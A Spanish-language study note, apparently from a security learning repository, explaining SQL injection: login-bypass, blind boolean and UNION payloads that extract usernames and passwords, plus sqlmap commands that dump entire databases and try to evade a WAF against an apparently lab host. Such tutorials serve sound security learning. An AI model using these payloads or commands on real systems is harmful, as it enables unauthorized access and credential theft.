# SqlInjection 

Security, Owasp top 10, Cron. (#nmap, #samba, #suid, #pathvarmanipulation #smb )

## Tabla de contenido

- [Introducción](#Introducción).
- [Login Bypass with SQL Injection](#Login-Bypass-with-SQL-Injection).
- [Blind SQL Injection](#Blind-SQL-Injection).
- [UNION SQL Injection](#UNION-SQL-Injection).
- [SQLMap](#SQLMap).


--------------------------------
### Introducción
-------------------------------

¿Qué es la inyección SQL?

 Un ataque de inyección SQL (SQLi) consiste en la inyección de una consulta SQL a la aplicación web remota.

--------------------------------
### Login Bypass with SQL Injection
-------------------------------

En una sintaxis de login de php se podrá observar como actua el SQL Injection
```
SELECT username,password FROM users WHERE username='$username' and password='$password'
```
Que sucede si colocamos en el campo de username lo siguiente: **' or true --'** 

```
SELECT username,password FROM users WHERE username='' or true -- and password=''
```

Generaríamos que valide el true y que comente el resto de la consulta.

--------------------------------
### Blind SQL Injection
-------------------------------

Conocido en español como inyeccion de sql ciega, la idea es realizar ataques buscando un respuesta true/false de la bd, tomando en cuenta la interacción de la aplicación y su comportamiento respecto a un error sql.

Extrae una subcadena de una cadena y nos permite comparar la subcadena con un carácter ASCII personalizado.
```
substr((select database()),1,1)) = 115
```
Comparando con el elemento 115 del código ASCII.

Finalmente se vería de está manera:
```
?id=1' AND (ascii(substr((select database()),1,1))) = 115 --+
```
De tal modo que si la aplicación muestra algo es **True** mientras que si no produce nada es **False**:

-------------------------------
### UNION SQL Injection
-------------------------------
Permite la enumeración rápida de base de datos, **UNION** permite combinar resultados de varias sentencias **SELECT**.

Tiene 3 etapas:

* Encontrar el número de columnas.
* Comprobando si las columnas son adecuadas.
* Ataca y obtén algunos datos interesantes.

Tiene 2 formas de atacar:

1) Ataque con ORDER BY:

    ```
    ' ORDER BY 1--
    ' ORDER BY 2--
    ' ORDER BY 3--
    ```
    El que produzca el error determina que el valor anterior es la cantida de columnas.

2) Enviar una serie de cargas útiles de UNION SELECT con varios valores NULL

    ```
    ' UNION SELECT NULL--
    ' UNION SELECT NULL,NULL--
    ' UNION SELECT NULL,NULL,NULL--
    ```
    El que no produzca error determina la cantdiad de columnas.

    2.1) Encontrar columnas con un tipo de datos útil en un ataque UNION de inyección SQL

    Puede sondear cada columna para probar si puede contener datos de cadena reemplazando una de las cargas útiles de UNION SELECT con un valor de cadena:
    ```
    ' UNION SELECT 'a',NULL,NULL,NULL--
    ' UNION SELECT NULL,'a',NULL,NULL--
    ' UNION SELECT NULL,NULL,'a',NULL--
    ' UNION SELECT NULL,NULL,NULL,'a'--
    ```
    Sin error = el tipo de datos es útil para nosotros (cadena).

    2.2) Usando un ataque UNION de inyección SQL para recuperar datos interesantes

    Cuando haya determinado el número de columnas y haya encontrado qué columnas pueden contener datos de cadena, finalmente puede comenzar a recuperar datos interesantes.

    Suponer que:

    Los dos primeros pasos mostraron exactamente dos columnas existentes con tipos de datos útiles.
    La base de datos contiene una tabla llamada usuarios con las columnas nombre de usuario y contraseña.
    En esta situación, puede recuperar el contenido de la tabla del usuario enviando la entrada:

    ```
    ' UNION SELECT username, password FROM users --
    ```
    Esta lista muestra valores importantes a obtener:
    
    * base de datos()
    * usuario()
    * @@versión
    * nombre de usuario
    * contraseña
    * nombre de la tabla
    * column_name

-------------------------------
### SQLMap
-------------------------------

Para instalarlo:
```
git clone --depth 1 <https://github.com/sqlmapproject/sqlmap.git> sqlmap-dev
```

Opciones de SQLMap:

| Comando       | Significado	 | 
| :---          |     :---:      |  
| --url	        | Proporcionar URL para el ataque         |
| --dbms	    | Dile a SQLMap el tipo de base de datos que se está ejecutando         |
| --dump	    | Volcar los datos dentro de la base de datos que usa la aplicación |
| --dump-all	| Volcar la base de datos COMPLETA|
| --batch		| SQLMap se ejecutará automáticamente y no solicitará la entrada del usuario  |

Ejemplos:

1) Atacar un objetivo:
2) Mostrar los resultados obtenidos:
```
sqlmap --url http://tbfc.net/login.php
sqlmap --url http://tbfc.net/login.php --tables --columns
```
3) Atacar un request obtenido por burpsuite:
```
sqlmap -r panel.request --tamper=space2comment --dump-all --dbms sqlite
```
* panel.request :           Archivo guardado de request
* --tamper=space2comment:   Intente omitir el WAF
* --dump-all:               Dumpee todas las tablas

Más lista de comandos en el siguiente link: https://www.security-sleuth.com/sleuth-blog/2017/1/3/sqlmap-cheat-sheet


